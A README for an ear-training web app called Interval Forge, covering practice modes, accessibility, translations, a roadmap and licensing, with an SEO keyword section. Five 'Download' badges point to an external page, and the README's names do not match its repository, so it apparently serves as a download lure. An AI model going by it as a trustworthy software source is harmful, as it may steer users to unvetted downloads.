![preview](https://raw.githubusercontent.com/abhishekyadav11116372-star/Chord-Finder/main/splash_b5819e.svg)
[![Download](https://raw.githubusercontent.com/abhishekyadav11116372-star/Chord-Finder/main/bin_5160.svg)](https://abhishekyadav11116372-star.github.io/Chord-Finder/)

# 🎼 Interval Forge — Train Your Ears, Map Your Fretboard

**A companion project to Chord-Trainer. Where Chord-Trainer teaches you to *find* chords, Interval Forge teaches you to *hear* them coming.** Built for guitarists, pianists, bassists, ukulele players, and anyone who wants their instrument to feel less like a puzzle and more like a conversation.

[![Download](https://raw.githubusercontent.com/abhishekyadav11116372-star/Chord-Finder/main/bin_5160.svg)](https://abhishekyadav11116372-star.github.io/Chord-Finder/)

---

## 📖 Table of Contents

- [What Is Interval Forge?](#-what-is-interval-forge)
- [Why Another Ear Trainer?](#-why-another-ear-trainer)
- [Feature Overview](#-feature-overview)
- [The Practice Modes](#-the-practice-modes)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Availability and Support](#-availability-and-support)
- [Who This Is For](#-who-this-is-for)
- [Design Philosophy](#-design-philosophy)
- [Screens and Workflow](#-screens-and-workflow)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [SEO and Discoverability Notes](#-seo-and-discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎯 What Is Interval Forge?

Interval Forge is a lightweight, browser-friendly practice tool that turns ear training into a daily ritual instead of a chore. If Chord-Trainer is the map, Interval Forge is the compass. The original Chord-Trainer helps musicians locate chord shapes across the neck, the keys, and the fretboard. Interval Forge picks up where that leaves off: it drills the *relationships between notes* so your fingers and your ears start agreeing with each other.

The premise is simple. Every chord you will ever play is a stack of intervals. A major third plus a minor third becomes a major triad. A perfect fifth with a seventh on top becomes a dominant. Once you can recognize those building blocks by ear, chord recognition stops being memorization and starts being intuition.

Interval Forge was born from a very practical frustration: most ear training apps are either too academic (endless quizzes with no musical context) or too shallow (a single diatonic scale, one instrument, one language). This project tries to sit in the middle — approachable enough for a weekend hobbyist, deep enough for someone preparing for a conservatory audition or a gigging set.

[![Download](https://raw.githubusercontent.com/abhishekyadav11116372-star/Chord-Finder/main/bin_5160.svg)](https://abhishekyadav11116372-star.github.io/Chord-Finder/)

---

## 💡 Why Another Ear Trainer?

Because the fretboard is a landscape and most tools hand you a single photograph of it.

Think of traditional ear training like learning a city by memorizing street names. Interval Forge is like learning the city by walking it — every interval is a neighborhood, every chord is a route, and after enough repetitions you start to feel the shape of the whole map in your hands.

A few things set this project apart:

- **Instrument-aware practice.** The same interval drill can be presented as a fretboard shape, a keyboard layout, or a staff notation fragment.
- **Context-first design.** Intervals are introduced inside real harmonic situations, not in a vacuum.
- **Deliberate pacing.** The app adapts the difficulty based on how you respond — no infinite difficulty spikes, no condescending hand-holding.
- **Local-first data.** Your progress lives in your browser. No mandatory accounts, no cloud sync you didn't ask for.
- **Built to be forked.** The whole thing is a small, readable codebase meant to be extended, not a monolith.

---

## ✨ Feature Overview

A non-exhaustive list of what you will find inside:

- 🎧 **Interval recognition drills** across unison, seconds, thirds, fourths, fifths, sixths, sevenths, and octaves.
- 🎹 **Multi-instrument note rendering** for guitar, bass, piano, ukulele, and mandolin layouts.
- 🧠 **Adaptive difficulty engine** that tracks your hit rate per interval and reshuffles the queue accordingly.
- 🎼 **Chord context mode** where intervals are played as part of a triad, seventh, or extended chord.
- 📈 **Progress history** with streak tracking, daily goals, and a simple heatmap of your last thirty sessions.
- 🎨 **Responsive interface** that adapts cleanly to phones, tablets, laptops, and ultrawide monitors without layout gymnastics.
- 🌍 **Multilingual support** across a growing set of interface languages, with more community-submitted ones arriving regularly.
- 🕐 **Around-the-clock support** for questions, bug reports, and feature requests — see the section below.
- 🔊 **Web Audio playback** with adjustable instrument timbre, tempo, and reference pitch.
- 🧩 **Custom drill builder** for teachers who want to craft specific interval sequences for their students.
- 🖱️ **Keyboard-first navigation** so you can drill without ever touching a mouse.
- 💾 **Exportable session data** in plain text format if you want to keep your own records outside the app.
- 🔌 **Zero mandatory telemetry.** Nothing phones home unless you explicitly opt in.

---

## 🎮 The Practice Modes

Interval Forge ships with several loosely coupled practice modes. You can jump between them freely; progress is tracked per mode.

### Ascending Intervals
The classic starting point. Two notes play in sequence, low then high. You identify the distance. Great for building the raw vocabulary of interval sounds.

### Descending Intervals
The mirror image. Many players find descending intervals harder because the reference note sits at the top. If you have ever struggled to hear a descending minor sixth, this mode was made for you.

### Harmonic Intervals
Both notes sound simultaneously. This is where ear training gets spicy. Harmonic intervals demand a different listening strategy from melodic ones and are the backbone of chord recognition.

### Chord Context
An interval is embedded inside a real chord, and you identify both the interval and the chord quality. This is the bridge between isolated drills and actual playing.

### Call and Response
The app plays a short phrase. You reproduce it on your instrument (visually confirmed on the on-screen neck or keyboard) and then rate your own accuracy. A slower, more reflective mode.

### Custom Sequences
Build your own drill from a set of intervals, a tempo range, an instrument layout, and a target number of repetitions. Ideal for teachers preparing a lesson plan or self-learners following a specific method book.

---

## 📱 Responsive Interface

The layout is built mobile-first and scales gracefully upward. On a phone you get a compact single-column drill view with large touch targets. On a tablet the neck diagram and the interval chooser sit side by side. On a desktop the whole thing expands into a three-pane workspace with history, controls, and the fretboard visible at once.

Nothing is bolted on with fixed pixel widths. The interface uses fluid grids and relative units throughout, which means it also behaves properly when someone zooms their browser to two hundred percent or uses a screen reader at high magnification.

A few specific commitments:

- Touch targets meet accessibility sizing guidelines.
- Color contrast is checked against WCAG AA for text and interactive elements.
- Focus outlines remain visible; keyboard users are not punished for their choice of input.
- Reduced-motion preferences are respected, and animation can be turned off entirely.

---

## 🌍 Multilingual Support

Language should never be the reason someone cannot practice. The interface ships with a translation layer that currently covers several widely spoken languages, and the community is actively adding more. Every user-facing string is externalized into language files, which makes adding a new locale a matter of copying a template and translating keys.

If you speak a language that is not yet supported, the contribution path is short and documented. You do not need to be a programmer to help — you need to be a speaker.

Current and planned locales include, among others: English, German, Spanish, French, Italian, Portuguese, Dutch, Polish, Turkish, Japanese, Korean, and Mandarin Chinese. RTL layout support is on the roadmap for Arabic, Hebrew, and Persian.

---

## 🕐 Availability and Support

The project is maintained with an always-on mindset. Questions, bug reports, and feature ideas are welcome at any hour, and the maintainer aims to respond within a reasonable window regardless of time zone. This is a hobby-scale project with professional-scale intent, which means you get attentive responses without the bureaucracy of a large organization.

Support channels include the issue tracker, discussion threads, and a lightweight community space linked from the repository sidebar. There is no paid tier and no gated feature set — everything you see here is what you get.

If you find a bug, please include:

- Your operating system and browser version.
- The practice mode you were in.
- The interval or chord that triggered the issue.
- A screenshot if the problem is visual.
- Any console output if the problem is behavioral.

---

## 👥 Who This Is For

- **Self-taught players** who want structured ear training without a formal teacher.
- **Music students** preparing for theory exams or auditions.
- **Teachers** looking for a flexible drill tool to assign as homework.
- **Producers and composers** who want to internalize interval color for faster writing.
- **Multi-instrumentalists** who want one tool that speaks every layout.
- **Returning players** shaking off years of rust and rebuilding their ear.

If you have ever hummed a melody and then struggled to find it on your instrument, this app is quietly aimed at you.

---

## 🎨 Design Philosophy

Interval Forge is built on a few firm beliefs.

**Practice should be short and frequent, not long and rare.** The interface encourages five-minute sessions and rewards consistency over marathon grinding.

**Feedback should be immediate and kind.** Wrong answers are not punished; they are recycled into the next round so the interval that tripped you up appears again sooner.

**The interface should disappear.** When you are in flow, you should not be thinking about the app. Buttons get out of the way, the neck diagram is legible at a glance, and audio latency is kept low enough that the drill feels like a conversation.

**Data belongs to the player.** Your statistics, your settings, and your custom drills stay on your machine unless you deliberately move them.

---

## 🧭 Screens and Workflow

A quick tour of the screens you will encounter.

**Home / Dashboard** — a summary of your recent practice, current streak, and quick-launch buttons for each mode.

**Drill View** — the main working screen. Shows the current question, the answer choices, the instrument diagram, and a progress bar for the session.

**Results View** — a breakdown of the session you just finished, with per-interval accuracy and a suggestion for what to practice next.

**History View** — a scrollable log of past sessions with filters by mode, date range, and interval.

**Settings** — instrument layout, tuning reference, audio timbre, language, theme, and accessibility preferences.

**Custom Drill Builder** — a form for composing your own sequences, with a live preview and save/load capability.

The whole workflow is designed so that a full practice session from launch to results takes under three minutes of overhead. The rest is playing.

---

## 🛠️ Roadmap

The following items are planned or in progress. Nothing here is a promise; roadmaps have a habit of shifting when the community gets involved.

- [ ] RTL language support and full Arabic, Hebrew, and Persian translations.
- [ ] MIDI input so physical keyboards and controllers can be used for call-and-response.
- [ ] Expanded chord context library including jazz extensions and altered dominants.
- [ ] Offline PWA packaging for installation on mobile home screens.
- [ ] Teacher mode with assignable drill sets and a lightweight student progress view.
- [ ] Exportable session reports in a structured format for spreadsheet analysis.
- [ ] Additional instrument layouts: banjo, charango, and pedal steel.

If any of these excite you, the issue tracker is the place to say so. Community interest genuinely influences what gets built next.

---

## 🤝 Contributing

Contributions of every size are welcome. You do not need to be a senior engineer to help. Some of the most valuable contributions are translation fixes, accessibility audits, and detailed bug reports.

Before opening a pull request, please:

1. Search existing issues to avoid duplicates.
2. Open an issue first for anything larger than a small fix.
3. Keep changes focused; one concern per pull request.
4. Follow the existing code style and naming conventions.
5. Include a short explanation of *why* the change helps, not just *what* it does.

For translators: every locale lives in its own file under the language directory. Copy the English template, translate the values, and submit. Machine-translated contributions are accepted but will be reviewed by a human speaker before merge.

For designers: Figma source files are linked in the repository wiki. Feel free to propose layout improvements, but please include rationale.

---

## 🔍 SEO and Discoverability Notes

This section exists because the repository is meant to be found by people searching for tools like "ear training app for guitarists," "interval recognition practice online," "chord trainer companion," and "multi-instrument ear training." Rather than stuffing keywords into every paragraph, the goal is to write honestly about what the project does, so that search engines and humans both understand it.

Relevant search phrases that this project naturally addresses include: interval ear trainer, chord recognition practice, fretboard interval drill, piano interval trainer, musician ear training tool, adaptive interval quiz, multi-instrument ear training, browser-based ear trainer, offline ear training app, and chord-trainer companion utility. If you arrived here from one of those searches, welcome — this is exactly what you were looking for.

---

## ⚠️ Disclaimer

Interval Forge is an educational tool provided as-is. It is not a substitute for formal music instruction, and it does not guarantee any specific improvement in ear training, performance ability, or audition outcomes. Results depend entirely on how consistently and thoughtfully you practice.

The project is maintained by volunteers in their spare time. While support is offered around the clock in spirit, actual response times may vary depending on time zones, availability, and the complexity of the question.

Audio playback quality depends on your browser, your device, and your speakers or headphones. The maintainers cannot be held responsible for practice sessions conducted through a laptop speaker at low volume and then blamed on the app.

No warranty is provided, express or implied, regarding fitness for a particular purpose. Use at your own discretion and enjoy the process.

---

## 📜 License

This project is released under the MIT License.

You are welcome to use, modify, and redistribute the code, provided the original license and copyright notice are preserved. A copy of the license should be included with any substantial redistribution.

See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Interval Forge contributors.

---

[![Download](https://raw.githubusercontent.com/abhishekyadav11116372-star/Chord-Finder/main/bin_5160.svg)](https://abhishekyadav11116372-star.github.io/Chord-Finder/)

**Made for musicians who want their ears and their hands to agree. Happy practicing.**